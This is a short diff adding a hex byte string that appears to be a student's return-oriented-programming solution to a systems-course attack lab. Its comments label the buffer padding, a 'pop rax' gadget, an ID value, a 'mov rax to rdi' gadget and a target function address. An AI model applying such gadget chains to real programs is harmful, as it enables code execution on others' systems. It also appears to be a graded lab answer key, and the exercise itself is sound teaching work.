@@ -1,0 +1,14 @@
+/* padded by 24 digits */
+11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11 11
+
+/* this is a gadget that pops rax, references address 0x40193d+3 */
+40 19 40 00 00 00 00 00
+
+/* ID number */
+7c 74 93 1b 00 00 00 00
+
+/* move rax to rdi -> 401943 + 2 */
+45 19 40 00 00 00 00 00
+
+/* glow address */
+e8 17 40 00 00 00 00 00
